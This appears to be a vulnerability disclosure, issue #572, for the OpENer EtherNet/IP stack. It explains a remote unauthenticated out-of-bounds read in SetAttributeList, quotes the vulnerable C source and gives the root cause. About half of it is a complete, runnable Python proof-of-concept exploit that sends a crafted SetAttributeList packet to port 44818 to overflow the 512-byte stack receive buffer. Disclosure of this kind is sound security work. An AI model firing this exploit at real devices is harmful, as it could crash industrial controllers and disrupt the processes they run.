@@ -1,0 +1,221 @@
+issue #572
+
+Summary
+I found a remotely reachable server-side out-of-bounds read in the current master branch of OpENer.
+
+The bug is triggered in the real TCP explicit-message path (44818 / RegisterSession / SendRRData) when SetAttributeList targets a real, default-registered, non-settable kCipShortString attribute: Identity class, instance 1, attribute 7 (product_name).
+
+The root cause is that SetAttributeList() still tries to skip the incoming attribute value even when the attribute is not settable. For variable-length types, it calls GetCipDataTypeLength(attribute->type, message_router_request->data) on attacker-controlled request data without any remaining-length validation. For kCipShortString, this immediately performs an unbounded 1-byte read of the string length header through GetSintFromMessage().
+
+By crafting a long padded EPath so that message_router_request->data is positioned at the end of the TCP stack receive buffer, the length-header read crosses the right boundary of incoming_message[512] and ASan reports a stack-buffer-overflow (OOB read).
+
+At minimum, this is a remote unauthenticated denial of service in the default build.
+
+Version
+OpENer v2.3 / master branch up to commit 76b95cf
+
+Root cause
+1) SetAttributeList() reads attribute IDs, then enters the "attribute exists but is not settable" branch
+CipUint attribute_count_request = GetUintFromMessage(
+  &message_router_request->data);
+
+...
+
+for(size_t j = 0; j < attribute_count_request; j++) {
+  attribute_number = GetUintFromMessage(&message_router_request->data);
+  attribute = GetCipAttribute(instance, attribute_number);
+
+  ...
+
+  if(NULL != attribute) {
+
+    uint8_t set_bit_mask =
+      (instance->cip_class->set_bit_mask[CalculateIndex(attribute_number)]);
+    if( 0 != ( set_bit_mask & ( 1 << (attribute_number % 8) ) ) ) {
+      AddSintToMessage(kCipErrorSuccess, &message_router_response->message);
+      AddSintToMessage(0, &message_router_response->message);
+      attribute->decode(attribute->data,
+                        message_router_request,
+                        message_router_response);
+    } else {
+      AddSintToMessage(kCipErrorAttributeNotSetable,
+                       &message_router_response->message);
+      AddSintToMessage(0, &message_router_response->message);
+
+      // move request message pointer
+      size_t attribute_data_length = GetCipDataTypeLength(attribute->type,
+                                                          message_router_request->data);
+      if(0 != attribute_data_length) {
+        message_router_request->data += attribute_data_length;
+        message_router_response->general_status =
+          kCipErrorAttributeListError;
+      } else {
+        message_router_response->general_status = kCipErrorPartialTransfer;
+        return kEipStatusOkSend;
+      }
+    }
+  }
+}
+The bug is here: for a non-settable attribute, the code still tries to parse/skip the attacker-supplied value from request data, but does not validate whether enough bytes remain.
+
+2) GetCipDataTypeLength() performs a raw length-header read for kCipShortString
+case kCipShortString:
+  if(NULL != data){
+    length = GetSintFromMessage(&data) + 1; // string length + 1 byte length indicator
+  }
+  break;
+This function receives only a pointer, not a remaining-length argument.
+
+3) GetSintFromMessage() is an unchecked 1-byte read
+CipSint GetSintFromMessage(const EipUint8 **const buffer) {
+  const unsigned char *const buffer_address = (unsigned char *) *buffer;
+  EipUint8 data = buffer_address[0];
+  *buffer += 1;
+  return data;
+}
+So once message_router_request->data is at the end of the TCP receive buffer, this immediately becomes an OOB read.
+
+4) CreateMessageRouterRequestStructure() stores the post-path pointer as request data
+message_router_request->service = *data;
+data++;
+data_length--;
+
+size_t number_of_decoded_bytes;
+const EipStatus path_result =
+  DecodePaddedEPath(&(message_router_request->request_path),
+                    &data,
+                    &number_of_decoded_bytes);
+
+...
+
+message_router_request->data = data;
+message_router_request->request_data_size = data_length -
+                                            number_of_decoded_bytes;
+A long padded EPath can therefore push message_router_request->data very close to the end of the TCP input buffer.
+
+5) The TCP explicit-message receive buffer is stack-backed and 512 bytes by default
+CipOctet incoming_message[PC_OPENER_ETHERNET_BUFFER_SIZE] = { 0 };
+Default build configuration:
+
+set( OPENER_ETHERNET_BUFFER_SIZE "512" CACHE STRING "Number of bytes used for the Ethernet message buffer")
+add_definitions(-DPC_OPENER_ETHERNET_BUFFER_SIZE=${OPENER_ETHERNET_BUFFER_SIZE} )
+
+PoC
+
+#!/usr/bin/env python3
+import os
+import socket
+import struct
+import sys
+
+
+PORT = 44818
+HOST = os.environ.get("OPENER_HOST", "127.0.0.1")
+
+
+def encap(command: int, session: int, payload: bytes, context: bytes) -> bytes:
+    return struct.pack("<HHII8sI", command, len(payload), session, 0, context, 0) + payload
+
+
+def register_session(sock: socket.socket) -> int:
+    request = encap(0x0065, 0, struct.pack("<HH", 1, 0), b"REGSESSN")
+    sock.sendall(request)
+    response = sock.recv(1024)
+    if len(response) < 8:
+        raise RuntimeError(f"short RegisterSession response: {response.hex()}")
+    return struct.unpack_from("<I", response, 4)[0]
+
+
+def wrap_send_rr_data(session: int, cip: bytes, context: bytes) -> bytes:
+    cpf = struct.pack(
+        "<IHHHHHH",
+        0,      # interface handle
+        0,      # timeout
+        2,      # item count
+        0x0000, # Null Address Item
+        0x0000, # Null Address length
+        0x00B2, # Unconnected Data Item
+        len(cip),
+    ) + cip
+    return encap(0x006F, session, cpf, context)
+
+
+def build_path(path_size_words: int) -> bytes:
+    member_words = path_size_words - 2
+    if member_words < 0:
+        raise ValueError(path_size_words)
+    return bytes([path_size_words, 0x20, 0x01, 0x24, 0x01] + [0x28, 0x00] * member_words)
+
+
+def build_cip(mode: str) -> tuple[bytes, bytes]:
+    if mode == "baseline":
+        path = build_path(2)
+        data = struct.pack("<HHB", 1, 7, 0)  # attr_count=1, attr=7, short-string len=0
+        context = b"SALBASE!"
+    elif mode == "crash":
+        # 1 service + (1 + 233*2) path bytes + 4 request bytes == 472 CIP bytes,
+        # so the request_data pointer reaches offset 468 in the CIP payload. After
+        # SetAttributeList reads attr_count and attr_id, GetCipDataTypeLength()
+        # reads the short-string length byte one byte past incoming_message[512].
+        path = build_path(233)
+        data = struct.pack("<HH", 1, 7)  # attr_count=1, attr=7, no short-string length byte follows
+        context = b"SALCRSH!"
+    else:
+        raise ValueError(mode)
+
+    cip = bytes([0x04]) + path + data  # SetAttributeList
+    return cip, context
+
+
+def parse_mr_reply(response: bytes) -> None:
+    if not response:
+        print("response=timeout")
+        return
+
+    offset = 24 + 6 + 2 + 4 + 4
+    mr = response[offset:]
+    if len(mr) < 4:
+        print(f"response={response.hex()}")
+        return
+
+    reply_service, _reserved, general_status, add_status_size = mr[:4]
+    pos = 4
+    add_status = []
+    for _ in range(add_status_size):
+        add_status.append(struct.unpack_from("<H", mr, pos)[0])
+        pos += 2
+
+    print(
+        f"reply_service=0x{reply_service:02x} general_status=0x{general_status:02x} "
+        f"additional_status={add_status} payload={mr[pos:].hex()}"
+    )
+
+
+def main() -> int:
+    mode = sys.argv[1] if len(sys.argv) > 1 else "crash"
+    host = sys.argv[2] if len(sys.argv) > 2 else HOST
+    if mode not in {"baseline", "crash"}:
+        print(f"usage: {sys.argv[0]} [baseline|crash] [host]", file=sys.stderr)
+        return 2
+
+    cip, context = build_cip(mode)
+    packet = wrap_send_rr_data(0, cip, context)
+    print(f"mode={mode} host={host} cip_len={len(cip)} packet_len={len(packet)}")
+
+    with socket.create_connection((host, PORT), timeout=3.0) as sock:
+        session = register_session(sock)
+        print(f"session={session}")
+        packet = wrap_send_rr_data(session, cip, context)
+        sock.sendall(packet)
+        sock.settimeout(1.0)
+        try:
+            response = sock.recv(4096)
+        except socket.timeout:
+            response = b""
+
+    parse_mr_reply(response)
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
